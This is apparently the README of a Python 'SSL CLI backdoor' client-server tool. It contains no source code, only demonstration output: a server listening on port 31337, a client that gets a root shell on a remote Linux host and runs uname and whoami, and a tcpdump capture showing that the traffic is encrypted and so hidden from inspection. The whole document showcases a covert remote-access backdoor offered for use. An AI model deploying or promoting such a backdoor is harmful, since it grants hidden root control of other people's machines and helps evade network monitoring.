# SSL-CLI-Backdoor-Client-Server

In result on the server you get:
===============================
python server.py
Enter PEM pass phrase:  
Serving: 192.168.200.107 on port: 31337  

n result on the client you get:
===============================
[root@hq.nfsec ~]# python client.py
$ uname -a
Linux nfsec.co.uk 3.10.0-XXX bla bla

$ whoami
root 

TCPDUMP shows encrypted communication:

[root@nfsec ~]# tcpdump -i ens192 dst 192.168.200.107 and -s 1024 -A tcp port 31337

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode  
listening on ens192, link-type EN10MB (Ethernet), capture size 1024 bytes  
23:54:53.024601 IP SOURCE_IP.52689 > nfsec.co.uk.31337: Flags [S],  
seq 2690615083, win 64240,options [mss 1260,nop,wscale 0,nop,nop,sackOK], length 0  
E..4*.@.....>.~....k..zi._.+........................  
23:54:53.042655 IP SOURCE_IP.52689 > nfsec.co.uk.31337: Flags [.],  
ack 3152217485, win 64240, length 0  
E..(*.@.....>.~....k..zi._.,....P...<.........  
23:55:10.331534 IP SOURCE_IP.52689 > nfsec.co.uk.31337: Flags [P.],  
seq 0:247, ack 1, win 64240, length 247 E...+.@.....>.~....k..zi._.,....P....J  
............V....@b...i....W.t&R..Z...ya
..Z@....0.,.(.$........<./...A.....2...*
.&.......=5....+.'.#........g.@.3.2.....
